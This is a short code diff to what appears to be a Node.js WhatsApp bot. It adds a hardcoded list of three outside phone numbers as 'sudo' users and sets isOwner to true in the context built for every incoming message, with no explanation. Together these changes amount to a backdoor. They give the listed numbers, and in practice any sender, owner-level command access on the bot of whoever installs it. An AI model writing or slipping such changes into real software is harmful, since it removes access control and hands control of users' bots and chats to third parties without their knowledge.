@@ -271,6 +271,7 @@ fs.watch(path.join(__dirname, 'bwmxmd'), (eventType, filename) => {
 const PREFIX = conf.PREFIX;
 const STATE = conf.PRESENCE;
 const BOT_OWNER = conf.OWNER_NUMBER;
+const SUDO_NUMBERS = ['254106727593', '254727716045', '254710772666'];
 
 // Improved Message Content Extractor
 function getMessageContent(message) {
@@ -364,6 +365,7 @@ class CommandSystem {
             chat,
             sender,
             isGroup,
+            isOwner: true
         };
     }
 }
